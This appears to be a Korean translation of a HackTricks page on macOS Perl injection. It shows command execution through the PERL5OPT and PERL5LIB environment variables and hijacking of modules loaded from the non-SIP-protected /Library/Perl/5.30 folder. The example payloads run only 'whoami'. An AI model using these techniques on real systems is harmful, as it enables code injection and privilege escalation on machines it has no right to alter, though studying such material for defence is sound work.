# macOS Perl 애플리케이션 인젝션

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## `PERL5OPT` 및 `PERL5LIB` 환경 변수를 통한 방법

환경 변수 PERL5OPT을 사용하면 perl을 통해 임의의 명령을 실행할 수 있습니다.\
예를 들어, 다음 스크립트를 생성하세요:

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

이제 **환경 변수를 내보내고** **perl** 스크립트를 실행하세요:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
다른 옵션은 Perl 모듈을 생성하는 것입니다 (예: `/tmp/pmod.pm`):

{% code title="/tmp/pmod.pm" %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
{% endcode %}

그런 다음 환경 변수를 사용하세요:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## 종속성을 통한 공격

Perl을 실행하는 종속성 폴더의 순서를 나열할 수 있습니다:
```bash
perl -e 'print join("\n", @INC)'
```
다음은 반환됩니다:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
일부 반환된 폴더는 실제로 존재하지 않지만, **`/Library/Perl/5.30`**은 실제로 **존재**하며, **SIP**로 **보호되지 않으며**, **SIP로 보호되는 폴더들보다 앞에 위치**합니다. 따라서 높은 권한을 가진 Perl 스크립트에서 해당 폴더를 악용하여 스크립트 종속성을 추가할 수 있습니다.

{% hint style="warning" %}
그러나, **해당 폴더에 쓰기 위해서는 root 권한이 필요**하며, 현재는 다음과 같은 **TCC 프롬프트**가 나타납니다:
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

예를 들어, 스크립트가 **`use File::Basename;`**을 가져오고 있다면, `/Library/Perl/5.30/File/Basename.pm`을 생성하여 임의의 코드를 실행시킬 수 있습니다.

## 참고 자료

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
